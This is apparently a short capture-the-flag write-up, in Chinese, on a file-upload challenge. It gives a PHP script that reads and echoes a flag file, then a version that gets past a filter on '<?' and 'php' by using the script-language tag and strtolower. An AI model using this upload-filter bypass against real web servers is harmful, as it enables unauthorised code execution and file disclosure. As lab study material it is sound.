
# Upload

* 发现能上传php的文件，但是<?   和 php 被过滤了
``` 
<?php
    $filename = "../flag.php";
    $handle = fopen($filename, "r");//读取二进制文件时，需要将第二个参数设置成'rb'
    
    //通过filesize获得文件大小，将整个文件一下子读到一个字符串中
    $contents = fread($handle, filesize ($filename));
	echo  $contents;
    fclose($handle);
?>
```
* 将<?php 改为<script language="PHP">， 文件中的php改为.strtolower("PHP")
``` 
<script language="PHP">
    $filename = "../flag.".strtolower("PHP");
    $handle = fopen($filename, "r");//读取二进制文件时，需要将第二个参数设置成'rb'
    
    //通过filesize获得文件大小，将整个文件一下子读到一个字符串中
    $contents = fread($handle, filesize ($filename));
	echo  $contents;
    fclose($handle);
</script>
```